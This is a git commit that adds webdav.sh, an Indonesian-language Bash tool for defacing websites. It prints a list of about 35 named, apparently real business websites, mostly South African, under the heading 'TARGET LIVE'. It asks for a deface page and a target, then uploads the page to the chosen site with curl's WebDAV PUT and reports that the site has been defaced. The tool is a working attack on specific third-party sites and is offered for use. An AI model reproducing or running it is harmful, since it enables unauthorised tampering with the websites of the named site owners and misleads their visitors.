3d9d81fe7320a9bb2c4cb523797301fce80f7876
l•⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ <49530759+TheSploit@users.noreply.github.com>
2019-09-06 19:42:26 +0700

    Add files via upload

---
+++ webdav.sh
@@ -0,0 +1,104 @@
+#usr/bin/bash
+clear
+bi='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+blue='\e[1;34m'
+cyan='\e[0;36m'
+green='\e[0;34m'
+okegreen='\033[92m'
+lightgreen='\e[1;32m'
+grey="\033[0;37m"
+purple="\033[0;35m"
+yellow="\033[1;33m"
+Purple="\033[0;35m"
+Cafe="\033[0;33m"
+Fiuscha="\033[0;35m"
+mon="mon"
+lightcyan='\e[96m'
+white='\e[1;37m'
+nc="\e[0m"
+red='\e[1;31m'
+yellow='\e[1;33m'
+apt install openssl curl
+clear
+pkg install libcurl
+clear
+pip install curl
+clear
+pip2 install urllib3 chardet certifi idna requests
+clear
+echo
+echo $bi"####################["$cy"HELLO"$bi"]####################"
+echo $bi"##"$pu"========================================================="$bi"##"
+echo $bi"##                                                         ##"
+echo $pur"##|_     _|  |--.-----.|     __|.-----.|  |.-----.|__|  |  ##"
+echo $pur"##  |   | |     |  -__||__     ||  _  ||  ||  _  ||  |   _|##"
+echo $pur"##  |___| |__|__|_____||_______||   __||__||_____||__|____|##"
+echo $pur"## +-+-+-+-+                    |__|             +-+-+-+-+ ##"
+echo $me"#"$pu"  ______  _____ ______   ___   _____  _____"$me"   #"
+echo $me"#"$pu"  |  _  \|  ___||  ___| / _ \ /  __ \|  ___|"$me"  #"
+echo $me"#"$pu"  | | | || |__  | |_   / /_\ \| /  \/| |__ "$me"   #"
+echo $me"#"$pu"  | | | ||  __| |  _|  |  _  || |    |  __|"$me"   #"
+echo $me"#"$pu"  | |/ / | |___ | |    | | | || \__/\| |___"$me"   #"
+echo $me"#"$pu"  |___/  \____/ \_|    \_| |_/ \____/\____/"$me"   #"
+echo $me"################################################"
+echo $me"#"$pu" SIMPAN SCRIPT  KAMU DI PENYIMPANAN"$me"     #"
+echo $me"#"$pu" INTERNAL LALU BERI NAMA "$me"  #"
+echo $me"#"$pu" MENJADI index.html "$me" #"
+echo $me"################################################"
+sleep 3
+echo
+echo $cy"::::::::::::::::::::::::::::::::::::::::::"
+echo $cy":"$ku"           TARGET  LIVE"$bi"                 :"
+echo $cy"::::::::::::::::::::::::::::::::::::::::::"
+echo $cy":"$pu" http://contsol.co.za/"$cy"                  :"
+echo $cy":"$pu" http://colourfactory.co.za/"$cy"            :"
+echo $cy":"$pu" http://chillibitez.co.za/"$cy"              :"
+echo $cy":"$pu" http://chasingfantasia.com/"$cy"            :"
+echo $cy":"$pu" http://centraltech.co.za/"$cy"              :"
+echo $cy":"$pu" http://cblandscapes.co.za/"$cy"             :"
+echo $cy":"$pu" http://bee-it.co.za/"$cy"                   :"
+echo $cy":"$pu" http://butterflowers.co.za/"$cy"            :"
+echo $cy":"$pu" http://bananabox.co.za/"$cy"                :"
+echo $cy":"$pu" http://ayk.co.za/"$cy"                      :"
+echo $cy":"$pu" http://ads247.co.za/"$cy"                   :"
+echo $cy":"$pu" http://allpaint.co.za/"$cy"                 :"
+echo $cy":"$pu" http://atlanticphysio.co.za/"$cy"           :"
+echo $cy":"$pu" http://valdicare.co.za/"$cy"                :"
+echo $cy":"$pu" http://vmicl.co.za/"$cy"                    :"
+echo $cy":"$pu" http://troon.co.za/"$cy"                    :"
+echo $cy":"$pu" http://nyarhi.co.za/"$cy"                   :"
+echo $cy":"$pu" http://nitrobikes.co.za/"$cy"               :"
+echo $cy":"$pu" http://nhisa.co.za/"$cy"                    :"
+echo $cy":"$pu" http://netcallcollect.co.za/"$cy"           :"
+echo $cy":"$pu" http://naturaleyeimages.com/"$cy"           :"
+echo $cy":"$pu" http://mpark.co.za/"$cy"                    :"
+echo $cy":"$pu" http://moneyin1week.co.za/"$cy"             :"
+echo $cy":"$pu" http://mix007.co.za/"$cy"                   :"
+echo $cy":"$pu" http://mediacube.co.za/"$cy"                :"
+echo $cy":"$pu" http://megro.co.za/"$cy"                    :"
+echo $cy":"$pu" http://menogold.co.za/"$cy"                 :"
+echo $cy":"$pu" http://mestern.co.za/"$cy"                  :"
+echo $cy":"$pu" http://tcmgroup.co.za/"$cy"                 :"
+echo $cy":"$pu" http://sublimeconfectionery.co.za/"$cy"     :"
+echo $cy":"$pu" http://tieronecapital.co.za/"$cy"           :"
+echo $cy":"$pu" http://thegiftstore.co.za/"$cy"             :"
+echo $cy":"$pu" http://thefoundation.co.za/"$cy"            :"
+echo $cy":"$pu" http://tressor.co.za/"$cy"                  :"
+echo $cy"::::::::::::::::::::::::::::::::::::::::::"
+sleep 2
+echo $i
+read -p"<===// MASUKAN NAMA SCRIPT DEFACE KAMU : " script
+echo
+echo
+read -p"<===// PASTEKAN SALAH SATU WEB DI ATAS : " target
+curl -T /storage/emulated/0/$script $target
+echo
+echo
+echo $cy"["$me"+"$cy"]"$i" WEB TELAH DIDEFACE "$cy"["$me"+"$cy"]"
+echo $bi"[*] SILAHKAN DICHECK"$i" ===>"$pur $target$script
